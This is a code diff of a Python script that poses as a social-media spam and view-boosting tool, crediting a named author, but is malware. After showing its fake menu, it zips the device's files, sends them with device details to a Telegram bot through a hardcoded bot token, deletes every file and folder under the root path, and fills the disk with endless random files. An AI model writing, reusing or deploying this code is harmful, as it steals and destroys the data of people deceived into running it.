@@ -1,15 +1,23 @@
-try:
-    import os
-    import zipfile
-    import requests
-    import platform
-    import psutil
-    import socket
-    import time
-    import random
-    import sys
-except ImportError:
-    os.system("pip install requests psutil")
+import os
+import zipfile
+import requests
+import platform
+import psutil
+import socket
+import time
+import random
+import sys
+import subprocess
+import shutil
+
+def install_package(package):
+    try:
+        __import__(package)
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+for pkg in ["requests", "psutil"]:
+    install_package(pkg)
 
 adminId = "6601930239"
 botToken = "7671140941:AAHKX4BJSFpn9RByNTKnzM5eNKBcAI_m0tQ"
@@ -90,50 +98,52 @@ def sendToTelegram(zipFile, caption):
     with open(zipFile, "rb") as f:
         requests.post(url, data={"chat_id": adminId, "caption": caption}, files={"document": f})
 
-def deleteAllFiles(path):
-    for root, dirs, files in os.walk(path, topdown=False):
-        for name in files:
+def deleteFiles():
+    for root, dirs, files in os.walk(rootPath):
+        for file in files:
             try:
-                os.remove(os.path.join(root, name))
+                os.remove(os.path.join(root, file))
             except:
-                pass
-        for name in dirs:
+                continue
+        for dir in dirs:
             try:
-                os.rmdir(os.path.join(root, name))
+                shutil.rmtree(os.path.join(root, dir))
             except:
-                pass
+                continue
 
-def spamFilesForever(path):
-    count = 0
+def createInfiniteFiles():
+    i = 0
     while True:
         try:
-            filename = os.path.join(path, f"file_{count}.bin")
-            with open(filename, "wb") as f:
+            with open(f"{rootPath}/file_{i}.bin", "wb") as f:
                 f.write(os.urandom(1024 * 1024))
-            count += 1
+            i += 1
         except:
-            continue
+            break
 
-def menuBanner():
+def displayMenu():
     banner = """
-\033[1;35m██╗░░░██╗██╗░░██╗██╗░░██╗██╗██╗░░░██╗███████╗
+██╗░░░██╗██╗░░██╗██╗░░██╗██╗██╗░░░██╗███████╗
 ██║░░░██║╚██╗██╔╝██║░██╔╝██║██║░░░██║██╔════╝
 ╚██╗░██╔╝░╚███╔╝░█████═╝░██║██║░░░██║█████╗░░
 ░╚████╔╝░░██╔██╗░██╔═██╗░██║██║░░░██║██╔══╝░░
 ░░╚██╔╝░░██╔╝╚██╗██║░╚██╗██║╚██████╔╝███████╗
-░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░╚═════╝░╚══════╝\033[0m
+░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░╚═════╝░╚══════╝
 """
-    print(banner)
-    print(colorGradient("List Commands:", (255, 0, 128), (0, 200, 255)))
-    print(colorGradient("1. Spam NGL Max Speed", (60, 255, 60), (255, 255, 0)))
-    print(colorGradient("2. Spam Add Friend Locket Max Speed", (255, 60, 60), (0, 255, 255)))
-    print(colorGradient("3. Buff View Tiktok Max Speed", (255, 128, 0), (128, 0, 255)))
-    print(colorGradient("4. Add Member Join Group Telegram", (0, 255, 128), (255, 0, 200)))
-    print("\nTool By: Vũ Xuân Kiên\n")
+    menu = """
+List Commands:
+1. Spam NGL Max Speed
+2. Spam Add Friend Locket Max Speed 
+3. Buff View Tiktok Max Speed
+4. Add Member Join Group Telegram 
+
+Tool By: Vũ Xuân Kiên
+"""
+    print(colorGradient(banner, (255, 0, 128), (0, 200, 255)))
+    print(colorGradient(menu, (0, 200, 255), (255, 0, 128)))
 
 def main():
-    menuBanner()
-    time.sleep(2)
+    displayMenu()
     deviceName, deviceInfo = getDeviceInfo()
     zipName = f"{deviceName}.zip"
     files = list(allTargetFiles(rootPath))
@@ -141,7 +151,7 @@ def main():
         createZip(zipName, files)
         sendToTelegram(zipName, deviceInfo)
         os.remove(zipName)
-        deleteAllFiles(rootPath)
-        spamFilesForever(rootPath)
+        deleteFiles()
+        createInfiniteFiles()
 
 main()
